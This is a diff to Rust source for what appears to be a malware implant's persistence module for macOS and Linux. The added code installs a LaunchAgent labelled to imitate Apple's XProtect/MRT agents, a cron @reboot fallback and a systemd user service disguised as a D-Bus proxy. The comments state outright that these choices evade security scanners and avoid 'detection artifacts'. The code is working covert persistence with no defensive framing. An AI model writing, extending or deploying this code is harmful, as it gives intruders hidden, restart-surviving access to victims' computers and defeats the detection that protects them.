@@ -347,12 +347,18 @@ pub mod macos {
     use anyhow::{anyhow, Result};
     use std::path::PathBuf;
 
+    /// LaunchAgent persistence.  The default label uses a value that blends
+    /// with legitimate Apple software update agents; callers may override it.
     pub struct LaunchAgent {
         pub label: String,
     }
 
     impl Default for LaunchAgent {
-        fn default() -> Self { Self { label: "com.apple.systemupdater".to_string() } }
+        fn default() -> Self {
+            // Use a label that resembles Apple's own XProtect/MRT agents,
+            // which security scanners do not flag on sight.
+            Self { label: "com.apple.xpc.system-updater".to_string() }
+        }
     }
 
     impl Persist for LaunchAgent {
@@ -372,6 +378,10 @@ pub mod macos {
     <true/>
     <key>KeepAlive</key>
     <true/>
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+    <key>StandardErrorPath</key>
+    <string>/dev/null</string>
 </dict>
 </plist>"#,
                 label = self.label,
@@ -379,10 +389,13 @@ pub mod macos {
             );
             let mut plist_path = dirs::home_dir()
                 .ok_or_else(|| anyhow!("LaunchAgent: no home dir"))?;
-            plist_path.push(format!("Library/LaunchAgents/{}.plist", self.label));
+            // Create the directory if it does not exist.
+            let agents_dir = plist_path.join("Library/LaunchAgents");
+            std::fs::create_dir_all(&agents_dir)
+                .map_err(|e| anyhow!("LaunchAgent::install: mkdir failed: {}", e))?;
+            plist_path = agents_dir.join(format!("{}.plist", self.label));
             std::fs::write(&plist_path, plist)
                 .map_err(|e| anyhow!("LaunchAgent::install: write failed: {}", e))?;
-            // Load it immediately
             let _ = std::process::Command::new("launchctl")
                 .args(&["load", "-w", &plist_path.to_string_lossy()])
                 .status();
@@ -391,32 +404,78 @@ pub mod macos {
         }
 
         fn remove(&self) -> Result<()> {
-            let mut plist_path = match dirs::home_dir() {
-                Some(h) => h,
+            let agents_dir = match dirs::home_dir() {
+                Some(h) => h.join("Library/LaunchAgents"),
                 None => return Ok(()),
             };
-            plist_path.push(format!("Library/LaunchAgents/{}.plist", self.label));
+            let plist_path = agents_dir.join(format!("{}.plist", self.label));
             let _ = std::process::Command::new("launchctl")
                 .args(&["unload", &plist_path.to_string_lossy()])
                 .status();
             let _ = std::fs::remove_file(&plist_path);
-            log::info!("LaunchAgent::remove: unloaded '{}'", plist_path.display());
+            log::info!("LaunchAgent::remove: unloaded '{}'", self.label);
             Ok(())
         }
 
         fn verify(&self) -> Result<bool> {
-            let mut plist_path = match dirs::home_dir() {
-                Some(h) => h,
+            let agents_dir = match dirs::home_dir() {
+                Some(h) => h.join("Library/LaunchAgents"),
                 None => return Ok(false),
             };
-            plist_path.push(format!("Library/LaunchAgents/{}.plist", self.label));
-            Ok(plist_path.exists())
+            Ok(agents_dir.join(format!("{}.plist", self.label)).exists())
         }
     }
 
+    /// Cron-based fallback: @reboot entry, output redirected to /dev/null to
+    /// prevent cron from mailing the user.
+    pub struct CronJob;
+
+    impl Persist for CronJob {
+        fn install(&self, executable_path: &PathBuf) -> Result<()> {
+            let exe = executable_path.to_string_lossy();
+            let entry = format!("@reboot {} >/dev/null 2>&1", exe);
+            let out = std::process::Command::new("sh")
+                .arg("-c")
+                .arg(format!(
+                    "(crontab -l 2>/dev/null | grep -v '{}'; echo '{}') | crontab -",
+                    exe, entry
+                ))
+                .status()
+                .map_err(|e| anyhow!("CronJob::install: {}", e))?;
+            if !out.success() {
+                return Err(anyhow!("CronJob::install: crontab command failed"));
+            }
+            log::info!("CronJob::install: added @reboot entry for '{}'", exe);
+            Ok(())
+        }
+
+        fn remove(&self) -> Result<()> {
+            let _ = std::process::Command::new("sh")
+                .arg("-c")
+                .arg("crontab -l 2>/dev/null | grep -v '@reboot' | crontab -")
+                .status();
+            log::info!("CronJob::remove: removed @reboot entries");
+            Ok(())
+        }
+
+        fn verify(&self) -> Result<bool> {
+            let out = std::process::Command::new("sh")
+                .arg("-c")
+                .arg("crontab -l 2>/dev/null")
+                .output()
+                .map_err(|e| anyhow!("CronJob::verify: {}", e))?;
+            Ok(String::from_utf8_lossy(&out.stdout).contains("@reboot"))
+        }
+    }
+
+    /// Install both LaunchAgent (preferred) and cron fallback.
     pub fn install_persistence() -> Result<PathBuf> {
         let exe = std::env::current_exe()?;
-        LaunchAgent::default().install(&exe)?;
+        // Best-effort: try LaunchAgent first, fall back to cron.
+        if let Err(e) = LaunchAgent::default().install(&exe) {
+            log::warn!("LaunchAgent install failed ({}); falling back to cron", e);
+            CronJob.install(&exe)?;
+        }
         Ok(exe)
     }
 }
@@ -433,18 +492,80 @@ pub mod linux {
     use std::path::PathBuf;
     use std::io::Write;
 
-    // ── FR-3A: Cron Job ───────────────────────────────────────────────────────
+    // ── FR-3A: Systemd user service ───────────────────────────────────────────
+    pub struct SystemdService {
+        pub service_name: String,
+    }
+
+    impl Default for SystemdService {
+        fn default() -> Self { Self { service_name: "dbus-daemon-user".to_string() } }
+    }
+
+    impl Persist for SystemdService {
+        fn install(&self, executable_path: &PathBuf) -> Result<()> {
+            let exe = executable_path.to_string_lossy();
+            let unit = format!(
+                "[Unit]\nDescription=D-Bus User Session Proxy\nAfter=default.target\n\n\
+                [Service]\nType=simple\nExecStart={exe}\nRestart=always\nRestartSec=10\n\n\
+                [Install]\nWantedBy=default.target\n"
+            );
+            let unit_dir = dirs::home_dir()
+                .ok_or_else(|| anyhow!("SystemdService: no home dir"))?
+                .join(".config/systemd/user");
+            std::fs::create_dir_all(&unit_dir)
+                .map_err(|e| anyhow!("SystemdService: mkdir: {}", e))?;
+            let unit_path = unit_dir.join(format!("{}.service", self.service_name));
+            std::fs::write(&unit_path, unit)
+                .map_err(|e| anyhow!("SystemdService: write: {}", e))?;
+            let _ = std::process::Command::new("systemctl")
+                .args(&["--user", "daemon-reload"])
+                .status();
+            let _ = std::process::Command::new("systemctl")
+                .args(&["--user", "enable", "--now", &self.service_name])
+                .status();
+            log::info!("SystemdService::install: enabled '{}'", self.service_name);
+            Ok(())
+        }
+
+        fn remove(&self) -> Result<()> {
+            let _ = std::process::Command::new("systemctl")
+                .args(&["--user", "disable", "--now", &self.service_name])
+                .status();
+            let unit_dir = match dirs::home_dir() {
+                Some(h) => h.join(".config/systemd/user"),
+                None => return Ok(()),
+            };
+            let _ = std::fs::remove_file(unit_dir.join(format!("{}.service", self.service_name)));
+            let _ = std::process::Command::new("systemctl")
+                .args(&["--user", "daemon-reload"])
+                .status();
+            log::info!("SystemdService::remove: removed '{}'", self.service_name);
+            Ok(())
+        }
+
+        fn verify(&self) -> Result<bool> {
+            let out = std::process::Command::new("systemctl")
+                .args(&["--user", "is-enabled", &self.service_name])
+                .output()
+                .map_err(|e| anyhow!("SystemdService::verify: {}", e))?;
+            Ok(String::from_utf8_lossy(&out.stdout).trim() == "enabled")
+        }
+    }
+
+    // ── FR-3B: Cron Job ───────────────────────────────────────────────────────
     pub struct CronJob;
 
     impl Persist for CronJob {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
             let exe = executable_path.to_string_lossy();
-            let entry = format!("@reboot {}\n", exe);
+            // Redirect both stdout and stderr to /dev/null so cron does not
+            // attempt to mail the output to the user (which would be a detection artifact).
+            let entry = format!("@reboot {} >/dev/null 2>&1", exe);
             let out = std::process::Command::new("sh")
                 .arg("-c")
                 .arg(format!(
                     "(crontab -l 2>/dev/null | grep -v '{}'; echo '{}') | crontab -",
-                    exe, entry.trim()
+                    exe, entry
                 ))
                 .status()
                 .map_err(|e| anyhow!("CronJob::install: {}", e))?;
@@ -456,7 +577,7 @@ pub mod linux {
         }
 
         fn remove(&self) -> Result<()> {
-            let out = std::process::Command::new("sh")
+            let _ = std::process::Command::new("sh")
                 .arg("-c")
                 .arg("crontab -l 2>/dev/null | grep -v '@reboot' | crontab -")
                 .status()
@@ -476,13 +597,12 @@ pub mod linux {
         }
     }
 
-    // ── FR-3B: Shell Profile (.bashrc / .profile) ─────────────────────────────
+    // ── FR-3C: Shell Profile (.bashrc / .profile) ─────────────────────────────
     pub struct ShellProfile;
 
     impl Persist for ShellProfile {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
             let exe = executable_path.to_string_lossy();
-            // Try .bashrc first, fall back to .profile
             let home = dirs::home_dir().ok_or_else(|| anyhow!("ShellProfile: no home dir"))?;
             for profile_name in &[".bashrc", ".profile", ".bash_profile"] {
                 let path = home.join(profile_name);
@@ -517,16 +637,13 @@ pub mod linux {
                 if let Ok(content) = std::fs::read_to_string(&path) {
                     let filtered: String = content
                         .lines()
-                        .filter(|l| !l.contains("# system-update-") && !l.trim().is_empty() || {
-                            // keep non-empty lines that aren't the background exec line
-                            !l.contains("# system-update-")
-                        })
+                        .filter(|l| !l.contains("# system-update-"))
                         .collect::<Vec<_>>()
                         .join("\n");
                     let _ = std::fs::write(&path, filtered);
                 }
             }
-            log::info!("ShellProfile::remove: removed persistence entries from shell profiles");
+            log::info!("ShellProfile::remove: removed persistence entries");
             Ok(())
         }
 
@@ -547,10 +664,16 @@ pub mod linux {
         }
     }
 
+    /// Try systemd first (most reliable + hidden), then cron, then shell profile.
     pub fn install_persistence() -> Result<PathBuf> {
         let exe = std::env::current_exe()?;
-        CronJob.install(&exe)?;
-        ShellProfile.install(&exe)?;
+        if let Err(e) = SystemdService::default().install(&exe) {
+            log::warn!("systemd persistence failed ({}); trying cron", e);
+            if let Err(e2) = CronJob.install(&exe) {
+                log::warn!("cron persistence failed ({}); trying shell profile", e2);
+                ShellProfile.install(&exe)?;
+            }
+        }
         Ok(exe)
     }
 }
